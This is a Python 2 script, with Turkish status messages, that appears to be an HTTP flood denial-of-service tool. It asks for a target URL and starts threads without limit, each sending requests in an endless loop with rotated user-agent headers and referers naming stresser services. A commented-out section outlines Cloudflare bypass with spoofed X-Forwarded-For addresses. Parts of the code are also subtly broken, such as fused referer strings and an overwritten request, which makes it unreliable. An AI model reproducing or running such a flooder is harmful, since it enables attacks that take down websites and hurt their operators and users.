import os
import socket
import argparse
import sys
import urllib2
import threading
import random
from banner import access
import cfscrape

if sys.platform == "linux" or sys.platform == "linux2":
    os.system("clear")
elif sys.platform == "win32":
    os.system("cls")

access.asciibanner()
print ("\033[1;32m")
url = raw_input("    links:  ").strip()
print ("\033[1;m")

count = 0
headers = []
referer = {
    "https://duckduckgo.com/",
    "https://www.google.com/",
    "https://www.youtube.com/"
    "https://www.yandex.com/"
    "http://hoppa.pw/"
    "https://twitter.com/"
    "https://web.telegram.org/"
    "https://erseljoule.com"
    "https://erseljoule.org.uk"
    "https://erseljoule.nl"
    "https://erseljoule.net"
    "https://erseljoule.xyz/"
    "https://hoppatr.com"
    "https://knaveofficial.com"
    "https://joulestresser.com"
    "https://joulestresser.xyz"
    "http://devlog.gregarius.net/docs/ua"
}


def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")

    return headers


def ascii(size):
    out_str = ''

    for e in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str


class httpth1(threading.Thread):
    def run(self):
        global count
        while True:
            try:
                print ("\033[1;32m saldiri basladi \033[1;m")
                #print ("Target: ", args.host, " is protected by Cloudfalre.")
                req = urllib2.Request(url + "?" + ascii(random.randint(3, 10)))
                req = urllib2.Request(url)
                req.add_header("User-Agent", random.choice(useragent()))
                req.add_header("User-Agent", "Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
                req.add_header("Referer", referer)
                urllib2.urlopen(req)
                count += 1
                print ("{0} attack basladi.".format(count))
            except urllib2.HTTPError:
                print ("\033[1;34m server down \033[1;m")
                pass
            except urllib2.URLError:
                print ("\033[1;34m Hatali link \033[1;m")
                sys.exit()
            except ValueError:
                print ("\033[1;34m [-]URL kontrol et.\033[1;m")
                sys.exit()
            except KeyboardInterrupt:
                exit("\033[1;34m [-]User ayrildi \033[1;m")
                sys.exit()
                
                # set request for cloud flare challenge page
   # def set_request_cf():
   # global request_cf
   # global proxy_ip
   # global proxy_port
   # cf_combine = random.choice(cf_token).strip().split("#")
   # proxy_ip = cf_combine[0]
   # proxy_port = cf_combine[1]
   # get_host = "GET " + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
   # tokens_and_ua = cf_combine[2]
   # '''
   # print("ip: "+cf_combine[0]+"\n")
   # print("port: "+cf_combine[1]+"\n")
   # print("Cookie&UA: "+cf_combine[2]+"\n")
   #  '''
   # accept = random.choice(acceptall)
   # randomip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + \
   #  "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
   # forward = "X-Forwarded-For: " + randomip + "\r\n"
   # connection = "Connection: Keep-Alive\r\n"
   # equest_cf = get_host + tokens_and_ua + accept + forward + connection + "\r\n"



while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("\033[1;34m [-]User Ayrildi \033[1;m")
